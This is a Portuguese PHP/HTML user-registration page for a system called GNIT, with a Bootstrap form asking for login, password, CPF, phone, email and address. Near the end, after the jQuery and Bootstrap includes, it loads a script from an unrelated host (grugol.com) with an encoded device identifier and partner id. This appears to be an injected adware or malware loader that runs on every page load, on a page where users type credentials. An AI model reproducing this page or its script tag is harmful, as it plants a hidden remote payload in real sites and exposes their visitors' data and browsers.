<?php

include 'configs/conexao.php';

?>

<html lang="pt-BR">

<head>

  <meta charset="UTF-8" />
  <title>Cadastro - GNIT</title>
  <meta charset="UTF-8">

  <!--Os arquivos Meta-->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <meta name="description" content="GNIT">
  <meta name="author" content="">
  <!--Fim dos arquivos Meta-->

  <!--Os Arquivos CSS-->
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="css/bootstrap-responsive.min.css" rel="stylesheet">
  <link href="css/template.css" rel="stylesheet">
  <link href="css/cadastro.css" rel="stylesheet">


  <!--HTML5 shim,for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>

  <!-- Modal -->
  <div class="modal fade" id="edition-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title" id="modalLabel">Cancelar edição</h4>
        </div>
        <div class="modal-body">
          Deseja realmente cancelar essa edição?
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Sim</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
        </div>
      </div>
    </div>
  </div>




  <div class="col-md-12	">
    <form action="configs/usuario_salvar.php" class="form-horizontal form" method="POST">
      <fieldset>

        <img src="img/nit.jpg" />
        <legend style="text-align:center;">Preencha os campos abaixo para Cadastrar seu perfil</legend>


        <div class="form-group">
          <label class="col-md-4 control-label" for="login">Login:</label>
          <div class="col-md-4">
            <input id="textinput" name="login" type="text" placeholder="login" required="true" class="form-control input-md">
            <span class="help-block">Login para acessar o sistema</span>
          </div>
        </div>


        <div class="form-group">
          <label class="col-md-4 control-label" for="senha">Senha:</label>
          <div class="col-md-4">
            <input id="textinput" name="senha" type="password" placeholder="Senha" required="true" class="form-control input-md">
            <span class="help-block">Senha para acessar o sistema</span>
          </div>
        </div>

        <div class="form-group">
          <label class="col-md-4 control-label" for="nome">Nome</label>
          <div class="col-md-4">
            <input id="textinput" name="nome" type="text" placeholder="Seu nome" required="true" class="form-control input-md">
            <span class="help-block">Nome completo</span>
          </div>
        </div>



        <div class="form-group">
          <label class="col-md-4 control-label" for="cpf">CPF:</label>
          <div class="col-md-4">
            <input id="textinput" name="cpf" type="text" placeholder="CPF" required="true" class="form-control input-md">
            <span class="help-block">Sem traços ou Pontos</span>
          </div>
        </div>

        <div class="form-group">
          <label class="col-md-4 control-label" for="vinculo">Vínculo Empregatício: </label>
          <div class="col-md-4">
            <select id="selectbasic" name="vinculo" required="true" required="true" class="form-control">
              <option value="1">Bolsista</option>
              <option value="2">Coordenador(a)</option>
            </select>
            <span class="help-block">Selecione o vínculo empregatício</span>
          </div>
        </div>

        <div class="form-group">
          <label class="col-md-4 control-label" for="tel">Telefone:</label>
          <div class="col-md-4">
            <input id="textinput" name="tel" type="tel" placeholder="Telefone do usuário" required="true" class="form-control input-md">
            <span class="help-block">com DDD, sem parênteses</span>
          </div>
        </div>
        <div class="form-group">
          <label class="col-md-4 control-label" for="email">E-mail</label>
          <div class="col-md-4">
            <input id="passwordinput" name="email" type="email" placeholder="para entrar no sistema" required="true" class="form-control input-md">
            <span class="help-block">E-mail do usuário</span>
          </div>
        </div>

        <div class="form-group">
          <label class="col-md-4 control-label" for="expediente">Horário de Expediente </label>
          <div class="col-md-4">
            <select id="selectbasic" name="expediente" required="true" required="true" class="form-control">
              <option value="1">08h às 12h</option>
              <option value="2">13h às 17h</option>
              <option value="3">08h às 17h</option>
            </select>
            <span class="help-block">Selecione o horário de expediente</span>
          </div>
        </div>

        <div class="form-group">
          <label class="col-md-4 control-label" for="endereco">Endereço</label>
          <div class="col-md-4">
            <input id="textinput" name="endereco" type="text" placeholder="Endereço" required="true" class="form-control input-md">
            <span class="help-block">Rua, Bairro e Número </span>
          </div>
        </div>



        <div class="form-group">
          <label class="col-md-4 control-label" for="button1id"></label>
          <div class="col-md-8">
            <button type="submit" id="button1id" name="button1id" class="btn btn-success">enviar</button>
            <a href="propriedades.php"><button id="" name="" class="btn btn-inverse">cancelar</button></a>
          </div>
        </div>



      </fieldset>
    </form>
  </div>

  <div class="col-md-12">
    <footer>
      <h3>&copy GNIT - Todos os Direitos Reservados</h3>
    </footer>
  </div>
  </div>


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

  <!-- Latest compiled and minified JavaScript -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>
</body>

</html>

</html>